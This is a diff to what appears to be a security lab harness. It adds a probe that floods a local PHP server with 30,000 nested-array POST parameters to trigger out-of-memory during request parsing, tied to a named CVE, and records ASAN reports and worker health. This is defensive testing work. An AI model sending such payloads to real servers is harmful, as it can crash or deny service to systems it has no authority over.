@@ -703,6 +703,59 @@ def probe_http_only_arm(lab, probes):
                      worker_survived=(isinstance(health, dict) and health.get('ok') is True))))
 
 
+def probe_oom_parse(lab, probes):
+    """P14: CVE-2026-109618 direction — OOM while the POST parser is still
+    building nested arrays. The 8.4.27 fix adds ZEND_HAS_OOM() early exits in
+    php_variables.c/rfc1867.c and a memory_hard_limit_percent headroom.
+
+    Sends urlencoded nested-array parameters large enough to exhaust
+    memory_limit inside php_register_variable* during request parsing.
+    Observation only: records ASAN reports and worker state.
+    """
+    lab.request('/session')
+    pairs = []
+    for index in range(30000):
+        pairs.append('a[%d][k]=v' % index)
+    body = '&'.join(pairs).encode()
+    sock = socket.create_connection(('127.0.0.1', HTTP_PORT), timeout=10)
+    try:
+        head = ('POST /upload HTTP/1.1\r\nHost: 127.0.0.1\r\n'
+                'Content-Type: application/x-www-form-urlencoded\r\n'
+                'Content-Length: %d\r\nConnection: close\r\n\r\n' % len(body))
+        sock.sendall(head.encode() + body)
+        data = b''
+        while True:
+            block = sock.recv(65536)
+            if not block:
+                break
+            data += block
+    finally:
+        sock.close()
+    status = None
+    match = re.match(rb'HTTP/1\.[01] (\d+)', data)
+    if match:
+        status = int(match.group(1))
+    time.sleep(0.5)
+    log = lab.php_error_log()
+    oom = 'Allowed memory size of' in log
+    health = None
+    try:
+        health = lab.request('/health', timeout=5)
+    except Exception as exc:
+        health = str(exc)
+    probes.append(dict(
+        name='P14_oom_during_post_parse',
+        body_bytes=len(body), parameter_count=len(pairs),
+        response_status=status,
+        oom_during_parse=oom,
+        asan_reports=len(lab.asan_reports()),
+        worker_alive_after=(isinstance(health, dict) and health.get('ok') is True),
+        worker_pid=worker_pid(lab.out),
+        verdict=dict(oom_observed=oom,
+                     memory_error_observed=bool(lab.asan_reports()),
+                     worker_survived=(isinstance(health, dict) and health.get('ok') is True))))
+
+
 PROFILES = {
     'standard': dict(ini_extra=['session.upload_progress.min_freq=0'], probes=lambda lab, p: (
         probe_reachability(lab, p),
@@ -739,6 +792,11 @@ PROFILES = {
     'arm': dict(ini_extra=['session.upload_progress.min_freq=0',
                            'memory_limit=8M'], probes=lambda lab, p: (
         probe_http_only_arm(lab, p),
+    )),
+    'oomparse': dict(ini_extra=['session.upload_progress.min_freq=0',
+                                'memory_limit=8M', 'post_max_size=8M',
+                                'max_input_vars=50000'], probes=lambda lab, p: (
+        probe_oom_parse(lab, p),
     )),
 }
 
